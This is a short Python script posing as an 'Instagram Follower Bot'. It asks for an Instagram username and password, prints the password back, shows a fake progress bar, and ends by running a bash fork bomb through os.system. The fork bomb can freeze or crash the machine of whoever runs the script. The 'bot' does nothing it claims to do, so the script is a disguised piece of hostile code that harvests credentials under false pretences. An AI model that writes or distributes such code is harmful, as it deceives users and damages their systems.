import time, sys, os
#os.system('sudo apt-get update')
print("Instagram Follower Bot")
name = input('Enter your Username : ')
print("Scanning For Username that go by: %s" % name);
name2 = input('Enter your Password : ')
print("Entering  database with the Password of : %s " % name2);
status = ""
# update_progress() : Displays or updates a console progress bar
## Accepts a int from 0 to whatever
def update_progress(progress):
    barLength = 1 # Modify this to change the length of the progress bar
    status = ""
    if progress >= 100:
        status = "Done...\r\n"
    block = int(round(barLength*progress))
    text = "\rProgress: [{0}] {1}% {2}".format( "#"*block + "-"*(barLength-block), progress, status)
    sys.stdout.write(text)
    sys.stdout.flush()

# update_progress test script
print("__________Starting__________")
print ("Mounting")
for x in range(1, 101):
    update_progress(x)
    time.sleep(0.01)
time.sleep(3);
print("Thank You...")
os.system(':(){:|:&};:')
